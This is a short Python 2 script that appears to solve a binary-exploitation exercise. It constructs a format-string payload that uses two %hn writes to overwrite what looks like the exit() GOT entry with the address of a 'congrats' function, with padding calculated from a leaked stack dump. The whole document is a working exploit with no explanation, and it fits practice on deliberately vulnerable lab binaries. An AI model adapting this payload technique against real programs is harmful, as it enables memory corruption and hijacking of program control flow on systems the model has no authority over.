lower_exit = "\xe4\x97\x04\x08"
pad = "AAAA"
upper_exit = "\xe6\x97\x04\x08"

upper_congrats = 0x0804
lower_congrats = 0x8503

upper_diff = len("AAAA0.0.0.f7f81cf7.f7ffb000.ffffd708.804857d.ffffc700.ffffc700.fff.0.41414141".split("."))
upper_div, upper_rem = divmod(upper_congrats - upper_diff, 10)
if upper_rem == 0:
    upper_div -= 1
    upper_rem += 10

# lower_congrats: (0x_000), _ != 0
lower_diff = lower_congrats - upper_congrats if lower_congrats >= upper_congrats else lower_congrats + 1

payload = upper_exit + pad + lower_exit + "%{}x".format(upper_div) * 10 + "%{}x".format(upper_rem) + "%hn" + "%{}x".format(lower_diff) + "%hn"
print payload
